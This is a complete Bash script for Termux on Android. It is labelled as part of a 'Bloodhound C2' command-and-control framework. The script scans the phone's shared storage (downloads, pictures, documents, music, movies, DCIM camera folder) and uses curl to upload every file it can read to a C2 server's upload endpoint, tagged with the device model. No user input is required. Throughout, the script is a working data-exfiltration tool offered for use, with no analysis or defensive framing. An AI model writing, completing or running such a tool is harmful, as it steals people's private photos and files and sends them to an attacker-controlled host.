#!/data/data/com.termux/files/usr/bin/bash

# Android Auto-Upload Script for Bloodhound C2 - Termux Storage Access
# This script automatically uploads the entire Android storage to the C2 server
# No user input required - just execute and it uploads everything!

# C2 server configuration
C2_SERVER="http://{C2_HOST}:{C2_PORT}"
HOSTNAME=$(getprop ro.product.model 2>/dev/null || echo "Android_Device")

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
MAX_CONCURRENT_UPLOADS=10
UPLOAD_TIMEOUT=120
LOG_FILE="/data/data/com.termux/files/home/.auto_upload.log"

# Logging function
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${BLUE}[$timestamp]${NC} ${GREEN}[$level]${NC} $message"
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

# Check if curl is available
check_dependencies() {
    if ! command -v curl >/dev/null 2>&1; then
        echo -e "${RED}Error: curl is not available${NC}"
        echo "Please install curl: pkg install curl"
        exit 1
    fi
    
    if ! command -v find >/dev/null 2>&1; then
        echo -e "${RED}Error: find command not available${NC}"
        exit 1
    fi
}

# Test C2 server connection
test_c2_connection() {
    log "INFO" "Testing C2 server connection..."
    
    local response=$(curl -s -m 10 "$C2_SERVER/api/files/list" 2>/dev/null)
    if [ -n "$response" ]; then
        log "INFO" "C2 server connection successful"
        return 0
    else
        log "ERROR" "C2 server connection failed"
        return 1
    fi
}

# Format file size
format_file_size() {
    local bytes="$1"
    
    if [ "$bytes" -eq 0 ]; then
        echo "0 B"
        return
    fi
    
    local k=1024
    local sizes=("B" "KB" "MB" "GB" "TB")
    local i=0
    
    while [ "$bytes" -ge "$k" ] && [ "$i" -lt 4 ]; do
        bytes=$((bytes / k))
        i=$((i + 1))
    done
    
    echo "${bytes} ${sizes[$i]}"
}

# Upload single file
upload_file() {
    local file_path="$1"
    local description="$2"
    local tags="$3"
    
    if [ ! -f "$file_path" ]; then
        log "ERROR" "File not found: $file_path"
        return 1
    fi
    
    local file_name=$(basename "$file_path")
    local file_size=$(stat -c %s "$file_path" 2>/dev/null || echo "0")
    
    # Skip files larger than 100MB to avoid timeouts
    if [ "$file_size" -gt 104857600 ]; then
        log "WARN" "Skipping large file: $file_name ($(format_file_size $file_size))"
        return 1
    fi
    
    log "DEBUG" "Attempting to upload: $file_name ($(format_file_size $file_size))"
    

    
    # Upload using curl with proper multipart form data
    log "DEBUG" "Uploading file: $file_path"
    log "DEBUG" "File size: $(stat -c %s "$file_path" 2>/dev/null || echo 'unknown') bytes"
    
    local response=$(curl -s -X POST "$C2_SERVER/api/files/upload" \
        -F "file=@$file_path" \
        -F "hostname=$HOSTNAME" \
        -F "description=$description" \
        -F "tags=$tags" \
        -m "$UPLOAD_TIMEOUT" 2>/dev/null)
    

    
    if [ -n "$response" ]; then
        log "DEBUG" "Upload response: $response"
        return 0
    else
        log "ERROR" "Upload failed for $file_name - no response"
        return 1
    fi
}

# Auto-upload entire storage directory
auto_upload_storage() {
    local storage_dir="$HOME/storage"
    
    if [ ! -d "$storage_dir" ]; then
        log "ERROR" "Storage directory not found: $storage_dir"
        log "ERROR" "Please run: termux-setup-storage"
        return 1
    fi
    
    log "INFO" "AUTO-UPLOAD: Starting upload of entire Android storage..."
    log "INFO" "Storage directory: $storage_dir"
    log "INFO" "No user input required - uploading everything automatically!"
    log "INFO" "Using parallel uploads (max $MAX_CONCURRENT_UPLOADS concurrent)"
    
    # Simple file discovery - find all files in storage
    log "INFO" "Scanning for files in storage..."
    
    # Debug: Show what directories exist
    log "INFO" "Storage subdirectories found:"
    for subdir in "$storage_dir"/*; do
        if [ -d "$subdir" ]; then
            local subdir_name=$(basename "$subdir")
            local readable=""
            if [ -r "$subdir" ]; then
                readable=" (readable)"
            else
                readable=" (NOT readable)"
            fi
            log "INFO" "  $subdir_name$readable"
        fi
    done
    
    # Use actual Android storage paths instead of symlinks
    local android_storage="/storage/emulated/0"
    local all_files=()
    
    log "INFO" "Using actual Android storage path: $android_storage"
    
    # Check if we can access Android storage directly
    if [ -d "$android_storage" ] && [ -r "$android_storage" ]; then
        log "INFO" "✅ Direct access to Android storage successful"
        
        # Scan each directory separately to avoid permission issues
        for subdir in downloads pictures documents music movies dcim; do
            local full_path="$android_storage/$subdir"
            if [ -d "$full_path" ] && [ -r "$full_path" ]; then
                log "INFO" "Scanning $subdir directory..."
                
                # Find files in this directory, excluding thumbnails and hidden files
                local subdir_files=$(find "$full_path" -type f -readable -size -100M \
                    ! -path "*/\.*" \
                    ! -path "*/.thumbnails/*" \
                    ! -path "*/thumbnails/*" \
                    ! -name ".*" \
                    ! -name "*.tmp" \
                    ! -name "*.cache" \
                    2>/dev/null | head -500)
                local subdir_count=$(echo "$subdir_files" | wc -l)
                
                if [ "$subdir_count" -gt 0 ]; then
                    log "INFO" "  Found $subdir_count files in $subdir"
                    # Add files to array
                    while IFS= read -r file; do
                        if [ -n "$file" ]; then
                            all_files+=("$file")
                        fi
                    done <<< "$subdir_files"
                else
                    log "INFO" "  No files found in $subdir"
                fi
            else
                log "WARN" "Cannot access $subdir directory"
            fi
        done
    else
        log "WARN" "Cannot access Android storage directly, trying symlinked paths..."
        
        # Fallback to symlinked paths, but exclude thumbnails
        while IFS= read -r -d '' file; do
            # Skip thumbnail and hidden files
            if [[ "$file" != *"/.thumbnails/"* ]] && \
               [[ "$file" != *"/thumbnails/"* ]] && \
               [[ "$file" != *"/."* ]] && \
               [[ "$(basename "$file")" != .* ]]; then
                all_files+=("$file")
            fi
        done < <(find "$storage_dir" -type f -readable -print0 2>/dev/null | head -z -1000)
    fi
    
    local total_files=${#all_files[@]}
    
    # Debug: Show what was found
    log "INFO" "Raw find command output:"
    log "INFO" "find $storage_dir -type f -readable"
    
    if [ "$total_files" -gt 0 ]; then
        log "INFO" "Files found:"
        for i in {0..4}; do
            if [ $i -lt $total_files ]; then
                log "INFO" "  ${all_files[$i]}"
            fi
        done
        if [ "$total_files" -gt 5 ]; then
            log "INFO" "  ... and $((total_files - 5)) more files"
        fi
    else
        log "INFO" "No files found by find command"
    fi
    
    if [ "$total_files" -eq 0 ]; then
        log "WARN" "No readable files found in storage directory"
        log "INFO" "This might be due to permission restrictions"
        log "INFO" "Try running: termux-setup-storage"
        
        # Try to list what's actually in storage
        log "INFO" "Listing storage directory contents:"
        ls -la "$storage_dir" 2>/dev/null | while read line; do
            log "INFO" "  $line"
        done
        
        # Try to manually check some common directories
        log "INFO" "Manual file checks:"
        for subdir in downloads pictures documents music movies; do
            local full_path="$storage_dir/$subdir"
            if [ -d "$full_path" ]; then
                local file_count=$(ls -1 "$full_path" 2>/dev/null | wc -l)
                log "INFO" "  $subdir: $file_count items"
                
                # Try to list first few items
                local sample_items=$(ls -1 "$full_path" 2>/dev/null | head -3)
                if [ -n "$sample_items" ]; then
                    echo "$sample_items" | while read item; do
                        if [ -n "$item" ]; then
                            local item_path="$full_path/$item"
                            if [ -f "$item_path" ]; then
                                local item_size=$(stat -c %s "$item_path" 2>/dev/null || echo "0")
                                log "INFO" "    File: $item ($(format_file_size $item_size))"
                            elif [ -d "$item_path" ]; then
                                log "INFO" "    Dir: $item/"
                            else
                                log "INFO" "    Other: $item"
                            fi
                        fi
                    done
                fi
            fi
        done
        
        return 1
    fi
    
    log "INFO" "Found $total_files files to upload"
    log "INFO" "Estimated time: ~$((total_files * 2)) seconds"
    log "INFO" ""
    
    # Show sample of files found
    log "INFO" "Sample files found:"
    for i in {0..9}; do
        if [ $i -lt $total_files ]; then
            local file_path="${all_files[$i]}"
            local file_size=$(stat -c %s "$file_path" 2>/dev/null || echo "0")
            local file_size_formatted=$(format_file_size "$file_size")
            log "INFO" "  $(basename "$file_path") ($file_size_formatted)"
        fi
    done
    log "INFO" ""
    
    local success_count=0
    local fail_count=0
    local current_file=0
    
    # Process files using array (no subshell issues)
    for file_path in "${all_files[@]}"; do
        current_file=$((current_file + 1))
        
        # Skip if file is not readable
        if [ ! -r "$file_path" ]; then
            log "WARN" "Skipping unreadable file: $file_path"
            continue
        fi
        
        # Get relative path for description
        local relative_path="${file_path#$storage_dir}"
        relative_path="${relative_path#/}"
        
        # Create description
        local description="Android auto-upload - $relative_path"
        local tags="android,termux,auto,upload,storage"
        
        # Upload file
        if upload_file "$file_path" "$description" "$tags"; then
            success_count=$((success_count + 1))
            # Show file info
            local file_size=$(stat -c %s "$file_path" 2>/dev/null || echo "0")
            local file_size_formatted=$(format_file_size "$file_size")
            local file_extension="${file_path##*.}"
            echo -e "${GREEN}✓${NC} $relative_path (${file_size_formatted}, .${file_extension})"
        else
            fail_count=$((fail_count + 1))
            echo -e "${RED}✗${NC} $relative_path"
        fi
        
        # Show progress every 10 files
        if [ $((current_file % 10)) -eq 0 ]; then
            log "INFO" "Progress: $current_file/$total_files files processed"
            log "INFO" "Success: $success_count, Failed: $fail_count"
        fi
        
        # Small delay between uploads
        sleep 1
    done
    
    log "INFO" "=== AUTO-UPLOAD SUMMARY ==="
    log "INFO" "Total files processed: $total_files"
    log "INFO" "Success: $success_count, Failed: $fail_count"
    log "INFO" "Storage directory: $storage_dir"
    
    return $fail_count
}

# Main execution
main() {
    echo -e "${CYAN}=== Android Auto-Upload Script for Bloodhound C2 ===${NC}"
    echo "Termux Storage Access Enabled"
    echo "C2 Server: $C2_SERVER"
    echo "Device: $HOSTNAME"
    echo ""
    echo -e "${YELLOW}AUTO-UPLOAD MODE: No user input required!${NC}"
    echo "This script will automatically upload your entire Android storage"
    echo ""
    
    # Check dependencies
    check_dependencies
    
    # Test C2 connection
    if ! test_c2_connection; then
        echo -e "${RED}Cannot connect to C2 server. Exiting.${NC}"
        exit 1
    fi
    
    # Start auto-upload
    echo -e "${CYAN}Starting AUTO-UPLOAD in 5 seconds...${NC}"
    echo "Press Ctrl+C to cancel"
    echo ""
    
    for i in {5..1}; do
        echo -e "${YELLOW}Starting in $i seconds...${NC}"
        sleep 1
    done
    
    echo ""
    echo -e "${GREEN}Starting AUTO-UPLOAD now!${NC}"
    echo ""
    
    # Execute auto-upload
    if auto_upload_storage; then
        echo ""
        echo -e "${GREEN}AUTO-UPLOAD COMPLETED SUCCESSFULLY!${NC}"
        echo "Check your C2 server dashboard for uploaded files"
        exit 0
    else
        echo ""
        echo -e "${RED}AUTO-UPLOAD FAILED!${NC}"
        echo "Check the log file: $LOG_FILE"
        exit 1
    fi
}

# Run main function
main "$@"
